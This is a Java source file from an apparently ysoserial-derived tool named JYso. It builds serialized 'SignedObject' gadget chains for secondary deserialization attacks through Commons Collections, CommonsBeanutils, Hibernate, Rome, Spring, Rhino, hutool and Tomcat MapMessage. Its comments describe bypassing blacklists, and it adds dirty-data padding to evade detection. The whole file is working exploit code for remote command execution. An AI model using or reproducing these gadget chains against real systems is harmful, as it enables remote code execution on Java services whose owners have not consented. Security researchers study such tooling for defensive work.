package com.qi4l.JYso.gadgets;

import cn.hutool.core.comparator.PropertyComparator;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.SignedObjectUtils;
import com.qi4l.JYso.gadgets.utils.dirty.DirtyDataWrapper;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;
import org.springframework.beans.factory.ObjectFactory;

import java.awt.*;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.math.BigInteger;
import java.util.*;

import static com.qi4l.JYso.gadgets.utils.Reflections.getFieldValue;
import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
import static com.qi4l.JYso.gadgets.utils.Serializer.serialize;
import static com.qi4l.JYso.gadgets.utils.Utils.*;
import static java.lang.Class.forName;

/**
 * SignedObject 二次反序列化 Gadget，用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）
 * 利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；
 * yso 中大概包含如下几种可用的常见调用链：
 * 1. InvokerTransformer 调用任意方法（依赖 CC）
 * 2. BeanComparator 调用 getter 方法（依赖 CB）
 * 3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
 * 4. ToStringBean 调用全部 getter 方法（依赖 Rome）
 * 5. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
 * 6. MemberBox 反射调用任意方法（依赖 rhino）
 * 7. hutool.MapProxy 二次反序列化
 * 8. MapMessage 二次反序列化
 * <p>
 * 利用方式：
 * SignedObject 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000'
 * 最后2个类型是脏数据类型和长度，为0则不混淆
 * @author QI4L
 */

@SuppressWarnings({"rawtypes", "unchecked","unused"})
public class SignedObject implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        String[] commands = command.split(":");

        if (commands.length < 3) {
            throw new IllegalArgumentException("Command format is: <Type>:<Original_Type>:<Command_Base64>:<Dirty_Type>:<Dirty_Length>");
        }

        String type1 = commands[0];
        Object object = getOriginal(Arrays.copyOfRange(commands, 1, commands.length));

        switch (type1.toLowerCase()) {
            case "cb":
                return getSignedObjectWithCB(object);
            case "hibernate":
                return getSignedObjectWithHibernate(object);
            case "rome":
                return getSignedObjectWithRome(object);
            case "rhino":
                return getSignedObjectWithRhino(object);
            case "spring":
                return getSignedObjectWithSpring(object);
            case "cc4":
                return getSignedObjectWithCC4(object);
            case "cu":
                return getHutoolMapProxy(object);
            case "mm":
                return getMapMessage(object);
            case "cc":
            default:
                return getSignedObjectWithCCNoArray(object);
        }
    }


    public Object getOriginal(String[] args) throws Exception {
        final String payloadType = args[0];
        String command = args[1];

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        String realCmd = com.qi4l.JYso.gadgets.utils.Utils.base64Decode(command);

        final Class<? extends ObjectPayload<?>> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        ObjectPayload<?> payload = payloadClass.newInstance();
        Object object = payload.getObject(realCmd);

        if (args.length >= 3) {
            final String type = args[2];
            final String length = args[3];
            object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
        }

        return object;
    }

    // MapMessage二次反序列化
    public Object getMapMessage(Object serObj) throws Exception {
        Object mapMessage = Reflections.createWithoutConstructor("org.apache.catalina.tribes.tipis.AbstractReplicatedMap$MapMessage");
        Reflections.setFieldValue(mapMessage, "keydata", serialize(serObj));

        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add(1);
        queue.add(1);

        Object[] objects = (Object[]) getFieldValue(queue, "queue");
        objects[1] = mapMessage;

        Comparator<?> comparator = new PropertyComparator<>("getKey");
        setFieldValue(queue, "comparator", comparator);
        return queue;
    }

    // hutool.MapProxy 二次反序列化
    public Object getHutoolMapProxy(Object serObj) throws Exception {
        HashMap<String, Object> map = new HashMap<>();
        map.put("bounds", serialize(serObj));
        cn.hutool.core.map.MapProxy mapProxy = cn.hutool.core.map.MapProxy.create(map);
        Shape proxy = (Shape) Proxy.newProxyInstance(Shape.class.getClassLoader(), new Class[]{Shape.class}, mapProxy);

        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add(1);
        queue.add(1);

        Object[] objects = (Object[]) getFieldValue(queue, "queue");
        objects[1] = proxy;

        Comparator<?> comparator = new PropertyComparator<>("bounds");
        setFieldValue(queue, "comparator", comparator);
        return queue;
    }

    // CC 无数组二次反序列化
    public Object getSignedObjectWithCCNoArray(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);

        Map<?,?> old = new HashMap<>();
        Transformer invoke = new InvokerTransformer("toString", null, null);
        Map<?,?> newMap = LazyMap.decorate(old, invoke);
        TiedMapEntry entry = new TiedMapEntry(newMap, obj);
        Map<TiedMapEntry, Object> ht = new HashMap<>();
        ht.put(entry, obj);
        newMap.remove(obj);

        setFieldValue(invoke, "iMethodName", "getObject");
        return ht;
    }

    // CC4 无 TiedMapEntry 二次反序列化
    public Object getSignedObjectWithCC4(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);

        org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer<>("toString", new Class[0], new Object[0]);
        TransformingComparator comp = new TransformingComparator<>(transformer);
        TreeBag<Object> tree = new TreeBag<>((Comparator<? super Object>) comp);
        tree.add(obj);
        setFieldValue(transformer, "iMethodName", "getObject");
        return tree;
    }

    // CB 二次反序列化
    public Object getSignedObjectWithCB(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);

        final BeanComparator<?> comparator = new BeanComparator<>("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, (Comparator<? super Object>) comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        setFieldValue(comparator, "property", "object");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        return queue;
    }

    // Hibernate 二次反序列化
    public Object getSignedObjectWithHibernate(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
        Object getters = Hibernate1.makeGetter(obj.getClass(), "getObject");
        return Hibernate1.makeCaller(obj, getters);
    }


    // Rome 二次反序列化
    public Object getSignedObjectWithRome(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
        ObjectBean delegate = new ObjectBean(java.security.SignedObject.class, obj);
        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
        return makeMap(root, root);
    }


    // Spring-Core 二次反序列化
    public Object getSignedObjectWithSpring(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
        ObjectFactory<?> objectFactoryProxy = createMemoitizedProxy(createMap("getObject", obj), ObjectFactory.class);
        Type typeTemplatesProxy = createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
        Object typeProviderProxy = createMemoitizedProxy(createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        final Constructor<?> mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass"), 0);
        setFieldValue(mitp, "methodName", "getObject");
        return mitp;
    }

    // Rhino 二次反序列化
    public Object getSignedObjectWithRhino(Object serObj) throws Exception {
        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        setFieldValue(dummyScope, "associatedValues", associatedValues);
        Object initContextMemberBox = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        Reflections.setAccessible(makeSlot);
        Object slot = makeSlot.invoke(initContextScriptableObject, "QI4L", 0, 4);
        setFieldValue(slot, "getter", initContextMemberBox);
        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject", this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);
        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "object", 0, 2);
        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        setFieldValue(nativeJavaArray, "parent", dummyScope);
        setFieldValue(nativeJavaArray, "javaObject", obj);
        nativeJavaArray.setPrototype(scriptableObject);
        setFieldValue(nativeJavaArray, "prototype", scriptableObject);
        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        setFieldValue(nativeJavaObject, "parent", dummyScope);
        setFieldValue(nativeJavaObject, "isAdapter", true);
        setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        return nativeJavaObject;
    }
}
